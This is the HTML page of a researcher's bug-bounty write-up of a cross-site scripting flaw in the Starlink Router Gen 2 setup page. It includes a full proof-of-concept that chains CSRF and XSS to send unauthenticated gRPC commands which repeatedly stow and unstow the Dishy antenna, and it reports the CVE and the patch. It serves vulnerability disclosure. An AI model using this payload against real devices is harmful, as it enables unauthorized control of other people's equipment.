<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>2023 SpaceX / Starlink Router Gen 2 XSS (ENG) | hackintoanetwork</title>
<meta name="keywords" content="SpaceX, Starlink, Router, Dishy, Exploit, Hacking, Bug bounty">
<meta name="description" content="Found by @hackintoanetwork ">
<meta name="author" content="">
<link rel="canonical" href="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.98f4948b5f9d1eb30c08efd1a1a3990648838118106bb3eb19bf89d146e2681f.css" integrity="sha256-mPSUi1&#43;dHrMMCO/RoaOZBkiDgRgQa7PrGb&#43;J0UbiaB8=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://hackintoanetwork.com/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://hackintoanetwork.com/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://hackintoanetwork.com/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://hackintoanetwork.com/apple-touch-icon.png">
<link rel="mask-icon" href="https://hackintoanetwork.com/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="2023 SpaceX / Starlink Router Gen 2 XSS (ENG)" />
<meta property="og:description" content="Found by @hackintoanetwork " />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/" /><meta property="article:section" content="blog" />



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="2023 SpaceX / Starlink Router Gen 2 XSS (ENG)"/>
<meta name="twitter:description" content="Found by @hackintoanetwork "/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://hackintoanetwork.com/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "2023 SpaceX / Starlink Router Gen 2 XSS (ENG)",
      "item": "https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "2023 SpaceX / Starlink Router Gen 2 XSS (ENG)",
  "name": "2023 SpaceX \/ Starlink Router Gen 2 XSS (ENG)",
  "description": "Found by @hackintoanetwork ",
  "keywords": [
    "SpaceX", "Starlink", "Router", "Dishy", "Exploit", "Hacking", "Bug bounty"
  ],
  "articleBody": "TL;DR A Cross-Site Scripting (XSS) vulnerability in the initial captive portal page of the second-generation router could allow an attacker to take control of the router and Dishy.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS(Cross-Site Scripting) Overview of the Vulnerability This vulnerability arises due to insufficient input filtering for the ssid and password parameters on the initial router setup page (http://192.168.1.1/setup).\n\u003chtml\u003e \u003cbody\u003e \u003ch1\u003eProof of Concept\u003c/h1\u003e \u003cform id=\"PoC\" method=\"POST\" action=\"http://192.168.1.1/setup\"\u003e \u003cinput type=\"hidden\" name=\"ssid\" value='\" onfocus=javascript:alert(`XSS`); autofocus=\"'\u003e \u003c/form\u003e \u003cscript type=\"text/javascript\"\u003e document.addEventListener(\"DOMContentLoaded\", function() { document.getElementById(\"PoC\").submit(); }); \u003c/script\u003e \u003c/body\u003e \u003chtml\u003e This Cross-Site Scripting (XSS) vulnerability can be triggered in conjunction with a CSRF (Cross-Site Request Forgery) attack as shown in the above PoC (Proof of Concept).\nreproduce(PoC).mov\nExploit Typically, the captive portal page should only be activated at the router’s internal address, 192.168.1.1. However, in older routers, there was a bug that unexpectedly allowed access to the captive portal page at Dishy’s internal address, 192.168.100.1.\nhttp://192.168.1.1/setup → The captive portal page is displayed correctly.\nhttp://192.168.100.1/setup → The captive portal page is also displayed at this address.\n(Normally, access to the captive portal page should not be possible at Dishy’s internal address, 192.168.100.1.)\nUsing such a bug along with the Cross-Site Scripting (XSS) vulnerability allows for the circumvention of the browser’s Same-Origin Policy (SOP), enabling control over both the Router and Dishy.\n192.168.100.1_PoC.mov\nIt can be confirmed that the same Cross-Site Scripting (XSS) vulnerability occurs at the address http://192.168.100.1/setup as well.\nNow, let’s examine through an example how this bug can be exploited to gain control of the Router and Dishy.\nDishy Stow Request Analysis When the `Stow` command is issued from the administrator interface, the following HTTP Request is sent to `Dishy` (Note: The Stow command allows the Dishy antenna to be folded for movement or storage.)\nPOST /SpaceX.API.Device.Device/Handle HTTP/1.1 Host: 192.168.100.1:9201 Content-Length: 8 x-grpc-web: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36 content-type: application/grpc-web+proto Accept: */* Origin: http://dishy.starlink.com Referer: http://dishy.starlink.com/ Accept-Encoding: gzip, deflate, br Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close �} This Request’s header contains several important pieces of information.\nx-grpc-web: 1\nThis indicates the use of the gRPC-Web protocol.\n(gRPC-Web is a protocol that allows web clients to make gRPC calls to a server.)\ncontent-type: application/grpc-web+proto\nIt signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.\nRequest Body\nDishy Stow Request body (Hex)\n\\x00\\x00\\x00\\x00\\x03\\xef\\xbf\\xbd\\x7d\\x00 The request body contains data in the grpc-web+proto format, which likely holds the details of the Stow command.\nCombining this information, when a user issues the Stow command through the administrator interface, this command is transmitted to the Dishy device using the gRPC protocol. (This will cause the Dishy device to fold into a more manageable state for movement.)\nHowever, upon examining the Request, we can see that there is no authentication for the user sending this request.\nThis implies that someone other than the administrator could potentially send the same request to unauthorizedly control the Dishy.\nNevertheless, this security flaw requires the attacker to have physical access to the local network, which limits the scope of the attack compared to those that can occur remotely.\nPossibility and Limitations of CSRF Attacks This brings us to the question, “Can’t we just send the same request payload to perform a CSRF attack?”\nWhile CSRF (Cross-Site Request Forgery) might be a possible scenario, such attacks are limited by the browser’s Same-Origin Policy (SOP).\ngRPC requires a specific content-type header, which is application/grpc-web+proto.\nHowever, SOP (the Same-Origin Policy) mandates that this header is stripped by the browser when sending requests from a different origin.\nThis restriction prevents external sources from sending gRPC requests to Dishy.\nXSS: An Effective Way to Bypass SOP Normally, the Same-Origin Policy (SOP) restricts web browsers from making requests to different origins.\nHowever, by exploiting an Cross-Site Scripting (XSS) vulnerability, an attacker can execute scripts within the victim’s web browser.\nThese scripts are considered as originating from the same source (i.e., the website the victim is currently accessing).\nAs a result, the Same-Origin Policy (SOP) recognizes requests generated by these scripts as coming from the same origin, and thus the Same-Origin Policy (SOP) restrictions do not apply in this case.\nTherefore, in the case of CSRF (Cross-Site Request Forgery) attacks exploiting Cross-Site Scripting (XSS) vulnerabilities, especially for requests like gRPC that require a specific content-type header,\nthe attack script runs within the victim’s browser, treating it as a legitimate request, thus including the specific content-type header in the request.\nExploit PoC (Proof of Concept) Therefore, leveraging the Cross-Site Scripting (XSS) vulnerability and the previously mentioned bug, the Payload for sending a gRPC request to Dishy would be as follows:\n\u003chtml\u003e \u003cbody\u003e \u003ch1\u003eDishy Stow and Unstow\u003c/h1\u003e \u003cform id=\"PoC\" method=\"POST\" action=\"http://192.168.100.1/setup\"\u003e \u003cinput type=\"hidden\" name=\"password\" value='\"\u003e",
  "wordCount" : "884",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "hackintoanetwork",
    "logo": {
      "@type": "ImageObject",
      "url": "https://hackintoanetwork.com/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-P2FSMQE5SL"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-P2FSMQE5SL');
</script>

<header class="header sticky-header">
    <nav class="nav">
        <div class="logo">
            <a href="https://hackintoanetwork.com/" accesskey="h" title="hackintoanetwork (Alt + H)">hackintoanetwork</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://hackintoanetwork.notion.site/hackintoanetwork/Profile-9675d3a929ac44c9b2cb639f716f37ff" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://hackintoanetwork.com/">Home</a>&nbsp;»&nbsp;<a href="https://hackintoanetwork.com/blog/">Blogs</a></div>
    <h1 class="post-title">
      2023 SpaceX / Starlink Router Gen 2 XSS (ENG)
    </h1>
    <div class="post-description">
      Found by @hackintoanetwork 
    </div>
    <div class="post-meta">


Dec 2023

</div>
  </header> 
  <div class="post-content"><h1 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h1>
<hr>
<p>A <code>Cross-Site Scripting (XSS)</code> vulnerability in the initial captive portal page of the second-generation router could allow an attacker to take control of the <code>router</code> and <code>Dishy</code>.</p>
<h1 id="the-basics"><strong>The Basics</strong><a hidden class="anchor" aria-hidden="true" href="#the-basics">#</a></h1>
<hr>
<ul>
<li><strong>Product :</strong> Starlink Router Gen 2</li>
<li><strong>Tested Version :</strong> 2022.32.0 (The fix is in versions 2023.48.0 and up)</li>
<li><strong>Bug-class</strong> : XSS(Cross-Site Scripting)</li>
</ul>
<h1 id="overview-of-the-vulnerability"><strong><strong>Overview of the Vulnerability</strong></strong><a hidden class="anchor" aria-hidden="true" href="#overview-of-the-vulnerability">#</a></h1>
<hr>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img1.webp" alt="img1.webp"  />
</p>
<p>This vulnerability arises due to insufficient input filtering for the <code>ssid</code> and <code>password</code> parameters on the initial router setup page (<a href="http://192.168.1.1/setup">http://192.168.1.1/setup</a>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">h1</span>&gt;Proof of Concept&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PoC&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.1.1/setup&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssid&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;</span>&gt;
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">&lt;!-- &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt; --&gt;</span>
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;DOMContentLoaded&#34;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>				document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;PoC&#34;</span>).<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>This <code>Cross-Site Scripting (XSS)</code> vulnerability can be triggered in conjunction with a <code>CSRF (Cross-Site Request Forgery)</code> attack as shown in the above PoC (Proof of Concept).</p>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/reproduce(PoC).mov">reproduce(PoC).mov</a></p>
<h1 id="exploit"><strong>Exploit</strong><a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h1>
<hr>
<p>Typically, the captive portal page should only be activated at the router&rsquo;s internal address, 192.168.1.1. However, in older routers, there was a bug that unexpectedly allowed access to the captive portal page at Dishy&rsquo;s internal address, 192.168.100.1.</p>
<ul>
<li>
<p><a href="http://192.168.1.1/setup">http://192.168.1.1/setup</a> → The captive portal page is displayed correctly.</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img2.png" alt="http://192.168.1.1/setup"  />
</p>
</li>
<li>
<p><a href="http://192.168.100.1/setup">http://192.168.100.1/setup</a> → The captive portal page is also displayed at this address.</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img3.png" alt="http://192.168.100.1/setup"  />
</p>
</li>
</ul>
<p>(Normally, access to the captive portal page should not be possible at Dishy&rsquo;s internal address, 192.168.100.1.)</p>
<p>Using such a bug along with the <code>Cross-Site Scripting (XSS)</code> vulnerability allows for the circumvention of the browser&rsquo;s <code>Same-Origin Policy (SOP)</code>, enabling control over both the Router and Dishy.</p>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/192.168.100.1_PoC.mov">192.168.100.1_PoC.mov</a></p>
<p>It can be confirmed that the same <code>Cross-Site Scripting (XSS)</code> vulnerability occurs at the address <a href="http://192.168.100.1/setup">http://192.168.100.1/setup</a> as well.</p>
<p>Now, let&rsquo;s examine through an example how this bug can be exploited to gain control of the <code>Router</code> and <code>Dishy</code>.</p>
<h2 id="dishy-stow-request-analysis">Dishy Stow Request Analysis<a hidden class="anchor" aria-hidden="true" href="#dishy-stow-request-analysis">#</a></h2>
<hr>
<center>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/gif1.gif" alt="Starlink Dishy Stow"  />
</p>
</center>
When the `Stow` command is issued from the administrator interface, the following HTTP Request is sent to `Dishy`
<p>(Note: The <code>Stow</code> command allows the <code>Dishy</code> antenna to be folded for movement or storage.)</p>
<pre tabindex="0"><code>POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

�}
</code></pre><p>This Request&rsquo;s header contains several important pieces of information.</p>
<ul>
<li>
<p><strong>x-grpc-web: 1</strong></p>
<p>This indicates the use of the <strong><code>gRPC-Web</code></strong> protocol.</p>
<p>(<strong><code>gRPC-Web</code></strong> is a protocol that allows web clients to make gRPC calls to a server.)</p>
</li>
<li>
<p><strong>content-type: application/grpc-web+proto</strong></p>
<p>It signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.</p>
</li>
<li>
<p><strong>Request Body</strong></p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img4.png" alt="Dishy Stow Request body (Hex)"  />
</p>
<p>Dishy Stow Request body (Hex)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>\x00\x00\x00\x00\x03\xef\xbf\xbd\x7d\x00
</span></span></code></pre></div><p>The request body contains data in the <strong><code>grpc-web+proto</code></strong> format, which likely holds the details of the <strong><code>Stow</code></strong> command.</p>
</li>
</ul>
<p>Combining this information, when a user issues the <strong><code>Stow</code></strong> command through the administrator interface, this command is transmitted to the <strong><code>Dishy</code></strong> device using the gRPC protocol. (This will cause the Dishy device to fold into a more manageable state for movement.)</p>
<p>However, upon examining the Request, we can see that there is no authentication for the user sending this request.</p>
<p>This implies that someone other than the administrator could potentially send the same request to unauthorizedly control the <strong><code>Dishy</code></strong>.</p>
<p>Nevertheless, this security flaw requires the attacker to have physical access to the local network, which limits the scope of the attack compared to those that can occur remotely.</p>
<h2 id="possibility-and-limitations-of-csrf-attacks"><strong>Possibility and Limitations of CSRF Attacks</strong><a hidden class="anchor" aria-hidden="true" href="#possibility-and-limitations-of-csrf-attacks">#</a></h2>
<hr>
<p>This brings us to the question, &ldquo;Can&rsquo;t we just send the same request payload to perform a CSRF attack?&rdquo;</p>
<p>While <code>CSRF (Cross-Site Request Forgery)</code> might be a possible scenario, such attacks are limited by the browser&rsquo;s Same-Origin Policy (SOP).</p>
<p>gRPC requires a specific <strong><code>content-type</code></strong> header, which is <strong><code>application/grpc-web+proto</code></strong>.</p>
<p>However, <code>SOP (the Same-Origin Policy)</code>  mandates that this header is stripped by the browser when sending requests from a different origin.</p>
<p>This restriction prevents external sources from sending gRPC requests to <strong><code>Dishy</code></strong>.</p>
<h2 id="xss-an-effective-way-to-bypass-sop">XSS: An Effective Way to Bypass SOP<a hidden class="anchor" aria-hidden="true" href="#xss-an-effective-way-to-bypass-sop">#</a></h2>
<hr>
<p>Normally, the <code>Same-Origin Policy (SOP)</code> restricts web browsers from making requests to different origins.</p>
<p>However, by exploiting an <code>Cross-Site Scripting (XSS)</code> vulnerability, an attacker can execute scripts within the victim&rsquo;s web browser.</p>
<p>These scripts are considered as originating from the same source (i.e., the website the victim is currently accessing).</p>
<p>As a result, the <code>Same-Origin Policy (SOP)</code> recognizes requests generated by these scripts as coming from the same origin, and thus the <code>Same-Origin Policy (SOP)</code> restrictions do not apply in this case.</p>
<p>Therefore, in the case of <code>CSRF (Cross-Site Request Forgery)</code> attacks exploiting <code>Cross-Site Scripting (XSS)</code> vulnerabilities, especially for requests like gRPC that require a specific content-type header,</p>
<p>the attack script runs within the victim&rsquo;s browser, treating it as a legitimate request, thus including the specific content-type header in the request.</p>
<h2 id="exploit-poc-proof-of-concept">Exploit PoC (Proof of Concept)<a hidden class="anchor" aria-hidden="true" href="#exploit-poc-proof-of-concept">#</a></h2>
<hr>
<p>Therefore, leveraging the <strong><code>Cross-Site Scripting (XSS)</code></strong> vulnerability and the previously mentioned bug, the Payload for sending a gRPC request to <strong><code>Dishy</code></strong> would be as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">h1</span>&gt;Dishy Stow and Unstow&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PoC&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.100.1/setup&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">&lt;!-- &lt;input type=&#34;hidden&#34; name=&#34;ssid&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt; --&gt;</span>
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#34;&gt;&lt;script&gt;for(let i=0;i&lt;100;i++){setTimeout(()=&gt;{var xhr=new XMLHttpRequest();xhr.open(&#34;POST&#34;,&#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle&#34;,true);xhr.setRequestHeader(&#34;x-grpc-web&#34;,&#34;1&#34;);xhr.setRequestHeader(&#34;Content-Type&#34;,&#34;application/grpc-web+proto&#34;);xhr.onreadystatechange=()=&gt;{if(xhr.readyState==4&amp;&amp;xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=&gt;{var xhr2=new XMLHttpRequest();xhr2.open(&#34;POST&#34;,&#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle&#34;,true);xhr2.setRequestHeader(&#34;x-grpc-web&#34;,&#34;1&#34;);xhr2.setRequestHeader(&#34;Content-Type&#34;,&#34;application/grpc-web+proto&#34;);xhr2.onreadystatechange=()=&gt;{if(xhr2.readyState==4&amp;&amp;xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}&lt;/script&gt;&lt;input type=&#34;hidden&#39;</span>/&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;DOMContentLoaded&#34;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>				document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;PoC&#34;</span>).<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><h1 id="demo">Demo<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h1>
<hr>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/Exploit-PoC.mp4">Exploit-PoC.mp4</a></p>
<h1 id="cve">CVE<a hidden class="anchor" aria-hidden="true" href="#cve">#</a></h1>
<ul>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-49965">CVE-2023-49965</a> (Reserved)</li>
</ul>
<h1 id="timeline"><strong>TimeLine</strong><a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h1>
<ul>
<li>2023-10-10 : Vulnerability reported to SpaceX/Starlink</li>
<li>2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward <code>$500</code> USD )</li>
<li>2023-11-01 : Patched in the latest release (The fix is in versions 2023.48.0 and up)</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://hackintoanetwork.com/tags/spacex/">SpaceX</a></li>
      <li><a href="https://hackintoanetwork.com/tags/starlink/">Starlink</a></li>
      <li><a href="https://hackintoanetwork.com/tags/router/">Router</a></li>
      <li><a href="https://hackintoanetwork.com/tags/dishy/">Dishy</a></li>
      <li><a href="https://hackintoanetwork.com/tags/exploit/">Exploit</a></li>
      <li><a href="https://hackintoanetwork.com/tags/hacking/">Hacking</a></li>
      <li><a href="https://hackintoanetwork.com/tags/bug-bounty/">Bug bounty</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://hackintoanetwork.com/">hackintoanetwork</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
